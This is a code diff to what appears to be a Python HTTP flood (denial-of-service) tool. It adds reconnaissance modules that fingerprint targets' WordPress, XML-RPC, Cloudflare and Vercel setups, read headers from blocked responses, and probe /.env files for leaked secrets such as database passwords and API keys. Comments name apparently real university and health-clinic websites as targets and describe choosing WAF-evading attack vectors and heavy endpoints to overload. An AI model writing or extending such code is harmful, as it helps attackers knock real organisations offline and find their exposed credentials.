@@ -1507,16 +1507,33 @@ class AsyncHttpFlood(Thread):
             print(f"{bcolors.OKCYAN}[CHAOS WP-AUDIT] {added} plugin vulnerability endpoints loaded into attack queue.{bcolors.RESET}")
 
     def _chaos_xmlrpc_status_check(self):
-        """[V33] Smart XMLRPC Availability Check.
+        """[V33+] Smart XMLRPC Availability Check.
         Deep recon revealed:
         - puskesjaten1: xmlrpc.php returns 405 (Method Not Allowed = EXISTS but needs POST)
         - hardosoloplast: xmlrpc.php returns 403 (BLOCKED by LiteSpeed WAF)
         - konisolo/surakarta: 404 (doesn't exist, Laravel sites)
-        This means: 405 = GOLD (xmlrpc exists, we just need to POST), 403 = blocked, 404 = absent."""
+        405 = GOLD, 403 = blocked, 404 = absent. Also checks wp-json 401 = exists."""
         intel = self._chaos_intel
         if intel.get("infra_map", {}).get("xmlrpc_checked") or intel["total_executions"] != 15:
             return
         intel["infra_map"]["xmlrpc_checked"] = True
+        
+        # Also probe wp-json — even 401 means WordPress REST API exists
+        try:
+            import urllib.request
+            req2 = urllib.request.Request(f"{self._target.scheme}://{self._target.authority}/wp-json/")
+            req2.add_header('User-Agent', 'Mozilla/5.0')
+            try:
+                with urllib.request.urlopen(req2, timeout=3) as resp:
+                    intel["infra_map"]["wp_json_status"] = "OPEN"
+            except urllib.error.HTTPError as e:
+                if e.code == 401:
+                    intel["infra_map"]["wp_json_status"] = "AUTH_REQUIRED"
+                    if int(REQUESTS_SENT) < 500:
+                        print(f"{bcolors.OKCYAN}[CHAOS WP-JSON] wp-json exists (401 Auth Required). REST API is real, just protected.{bcolors.RESET}")
+                elif e.code == 200:
+                    intel["infra_map"]["wp_json_status"] = "OPEN"
+        except: pass
         
         try:
             import urllib.request
@@ -1590,9 +1607,9 @@ class AsyncHttpFlood(Thread):
             intel["target_getting_weaker"] = True
 
     def _chaos_wp_json_exploitation(self):
-        """[V32] WordPress REST API Endpoint Discovery and Exploitation.
-        Learned from puskesjaten1: the Link header exposes /wp-json/ endpoint.
-        We add heavy WP REST API endpoints to the multi-path queue."""
+        """[V32+] WordPress REST API Endpoint Discovery and Exploitation.
+        FIX: puskesjaten1 returns 401 on /wp-json/ (auth required but endpoint EXISTS).
+        401 = endpoint is real, just needs authentication. Still exploitable."""
         intel = self._chaos_intel
         if intel.get("cms_type") != "wordpress":
             return
@@ -2058,10 +2075,10 @@ class AsyncHttpFlood(Thread):
             except: pass
 
     def _chaos_vercel_detection(self):
-        """[V36] Vercel/Next.js Edge Detection.
+        """[V36+] Vercel/Next.js Edge Detection.
         Trained from raynaldotech.my.id: x-vercel-cache, x-nextjs-prerender headers.
-        Vercel uses edge functions and aggressive caching.
-        Strategy: Only STEALTH_JA3 works. All other methods get instant 403."""
+        FIX: Cloudflare may return 403, but error response STILL contains headers.
+        We must read headers from HTTPError as well!"""
         intel = self._chaos_intel
         if intel.get("infra_map", {}).get("vercel_checked"):
             return
@@ -2071,36 +2088,59 @@ class AsyncHttpFlood(Thread):
             import urllib.request
             req = urllib.request.Request(f"{self._target.scheme}://{self._target.authority}/")
             req.add_header('User-Agent', 'Mozilla/5.0')
-            with urllib.request.urlopen(req, timeout=5) as resp:
-                hdrs = dict(resp.headers)
-                if 'x-vercel-cache' in str(hdrs).lower() or 'x-vercel-id' in str(hdrs).lower():
-                    intel["infra_map"]["vercel"] = True
-                    intel["cms_type"] = "nextjs"
+            
+            hdrs = {}
+            try:
+                with urllib.request.urlopen(req, timeout=5) as resp:
+                    hdrs = dict(resp.headers)
+            except urllib.error.HTTPError as e:
+                # KEY FIX: Even 403 responses have headers!
+                hdrs = dict(e.headers) if hasattr(e, 'headers') else {}
+                if e.code == 403:
+                    # If CF blocks with 403, the WAF is very aggressive
+                    intel["infra_map"]["cf_strict_403"] = True
+            
+            hdrs_str = str(hdrs).lower()
+            
+            if 'x-vercel-cache' in hdrs_str or 'x-vercel-id' in hdrs_str:
+                intel["infra_map"]["vercel"] = True
+                intel["cms_type"] = "nextjs"
+                intel["waf_type"] = "cloudflare"
+                if int(REQUESTS_SENT) < 200:
+                    print(f"{bcolors.WARNING}[CHAOS VERCEL] Vercel Edge detected. Target has enterprise-grade edge protection.{bcolors.RESET}")
+                    print(f"{bcolors.WARNING}[CHAOS VERCEL] Only STEALTH_JA3 + SLOW_V2 vectors authorized. All others will be blocked.{bcolors.RESET}")
+                    
+            # Detect Cloudflare from error headers too
+            if 'cloudflare' in hdrs_str or 'cf-ray' in hdrs_str:
+                if intel.get("waf_type") in (None, "none", "unknown_heavy"):
+                    intel["waf_type"] = "cloudflare"
                     if int(REQUESTS_SENT) < 200:
-                        print(f"{bcolors.WARNING}[CHAOS VERCEL] Vercel Edge detected. Target has enterprise-grade edge protection.{bcolors.RESET}")
-                        print(f"{bcolors.WARNING}[CHAOS VERCEL] Only STEALTH_JA3 + SLOW_V2 vectors authorized. All others will be blocked.{bcolors.RESET}")
+                        print(f"{bcolors.WARNING}[CHAOS CF] Cloudflare WAF detected from response headers (even on 403 block).{bcolors.RESET}")
                         
-                # Check for Nuxt.js (ums.ac.id pattern)
-                powered = hdrs.get('x-powered-by', '').lower()
-                if 'nuxt' in powered:
-                    intel["infra_map"]["nuxtjs"] = True
-                    intel["cms_type"] = "nuxtjs"
-                    if int(REQUESTS_SENT) < 200:
-                        print(f"{bcolors.OKCYAN}[CHAOS NUXT] Nuxt.js SSR backend detected. Server-side rendering = heavy per request.{bcolors.RESET}")
-                        
-                # Check for Google Cloud proxy (via: 1.1 google)
-                via = hdrs.get('via', '').lower()
-                if 'google' in via:
-                    intel["infra_map"]["google_cloud"] = True
-                    if int(REQUESTS_SENT) < 200:
-                        print(f"{bcolors.OKCYAN}[CHAOS GCP] Google Cloud infrastructure detected. CDN-level edge caching active.{bcolors.RESET}")
+            # Check for Nuxt.js
+            powered = ''
+            for k, v in hdrs.items():
+                if k.lower() == 'x-powered-by': powered = v.lower()
+            if 'nuxt' in powered:
+                intel["infra_map"]["nuxtjs"] = True
+                intel["cms_type"] = "nuxtjs"
+                if int(REQUESTS_SENT) < 200:
+                    print(f"{bcolors.OKCYAN}[CHAOS NUXT] Nuxt.js SSR backend detected. Server-side rendering = heavy per request.{bcolors.RESET}")
+                    
+            # Check for Google Cloud proxy
+            via = ''
+            for k, v in hdrs.items():
+                if k.lower() == 'via': via = v.lower()
+            if 'google' in via:
+                intel["infra_map"]["google_cloud"] = True
+                if int(REQUESTS_SENT) < 200:
+                    print(f"{bcolors.OKCYAN}[CHAOS GCP] Google Cloud infrastructure detected. CDN-level edge caching active.{bcolors.RESET}")
         except: pass
 
     def _chaos_env_exposure_check(self):
-        """[V36] .env File Exposure Detection.
+        """[V36+] .env File Exposure Detection.
         uns.ac.id returns 200 with 477 bytes for /.env — CRITICAL security flaw!
-        This means environment variables (DB passwords, API keys) are exposed.
-        We don't steal data, but this tells us the server is poorly secured."""
+        FIX: Read full 500 bytes and check broader patterns including common env vars."""
         intel = self._chaos_intel
         if intel.get("infra_map", {}).get("env_checked"):
             return
@@ -2112,13 +2152,24 @@ class AsyncHttpFlood(Thread):
             import urllib.request
             req = urllib.request.Request(f"{self._target.scheme}://{self._target.authority}/.env")
             req.add_header('User-Agent', 'Mozilla/5.0')
-            with urllib.request.urlopen(req, timeout=3) as resp:
+            with urllib.request.urlopen(req, timeout=4) as resp:
                 if resp.status == 200:
-                    body = resp.read(200).decode('utf-8', errors='ignore')
-                    if 'APP_KEY' in body or 'DB_' in body or 'SECRET' in body.upper():
+                    body = resp.read(500).decode('utf-8', errors='ignore')
+                    body_upper = body.upper()
+                    env_signals = ['APP_KEY', 'DB_HOST', 'DB_PASSWORD', 'DB_DATABASE',
+                                   'SECRET', 'API_KEY', 'MAIL_', 'REDIS_', 'AWS_',
+                                   'APP_NAME', 'APP_ENV', 'APP_DEBUG', 'LOG_CHANNEL',
+                                   'BROADCAST_', 'CACHE_DRIVER', 'SESSION_DRIVER',
+                                   'QUEUE_', 'PUSHER_', 'MIX_']
+                    if any(sig in body_upper for sig in env_signals):
                         intel["infra_map"]["env_exposed"] = True
                         if int(REQUESTS_SENT) < 200:
                             print(f"{bcolors.FAIL}[CHAOS CRITICAL] .env file EXPOSED! Server is severely misconfigured. All defenses likely weak.{bcolors.RESET}")
+                    elif len(body.strip()) > 50 and '=' in body:
+                        # Looks like a config file even without exact matches
+                        intel["infra_map"]["env_exposed"] = True
+                        if int(REQUESTS_SENT) < 200:
+                            print(f"{bcolors.FAIL}[CHAOS CRITICAL] .env file EXPOSED (generic config detected)! Server is weak.{bcolors.RESET}")
         except: pass
 
     def _chaos_university_heuristics(self):
@@ -5746,8 +5797,10 @@ class HttpFlood(Thread):
                 else:
                     intel["waf_type"] = "none"
                     
-                # --- Detect CMS Type (expanded) ---
-                if 'wp-content' in body or 'wordpress' in body or 'wp-json' in body or 'wp-includes' in body:
+                # --- Detect CMS Type (expanded + header-based) ---
+                # FIX: Also check Link header for wp-json (uns.ac.id: stub page but Link header present)
+                link_header = headers_raw if isinstance(headers_raw, str) else ''
+                if 'wp-content' in body or 'wordpress' in body or 'wp-json' in body or 'wp-includes' in body or 'wp-json' in link_header:
                     intel["cms_type"] = "wordpress"
                 elif 'joomla' in body or '/media/system/js' in body:
                     intel["cms_type"] = "joomla"
@@ -6547,6 +6600,23 @@ class HttpFlood(Thread):
         # Phase 1.10.7: V32 REAL-WORLD INTELLIGENCE MODULES
         self._chaos_laravel_xsrf_harvest()
         self._chaos_litespeed_cache_bypass()
+        # [V36-FIX] WordPress Auto-Detect via wp-json probe (fixes uns.ac.id stub page)
+        # If CMS is still unknown/custom but wp-json endpoint exists, override to wordpress
+        if intel.get("cms_type") in ("custom", "unknown", None) and intel["total_executions"] == 12:
+            try:
+                import urllib.request
+                req = urllib.request.Request(f"{self._target.scheme}://{self._target.authority}/wp-json/")
+                req.add_header('User-Agent', 'Mozilla/5.0')
+                try:
+                    with urllib.request.urlopen(req, timeout=3) as resp:
+                        if resp.status == 200:
+                            intel["cms_type"] = "wordpress"
+                            print(f"{bcolors.OKCYAN}[CHAOS AUTO-WP] wp-json/ returned 200. CMS overridden to WordPress.{bcolors.RESET}")
+                except urllib.error.HTTPError as e:
+                    if e.code in (401, 405):
+                        intel["cms_type"] = "wordpress"
+                        print(f"{bcolors.OKCYAN}[CHAOS AUTO-WP] wp-json/ returned {e.code}. CMS overridden to WordPress (auth-protected).{bcolors.RESET}")
+            except: pass
         self._chaos_wp_json_exploitation()
         self._chaos_wp_plugin_vulnerability_scan()
         self._chaos_xmlrpc_status_check()
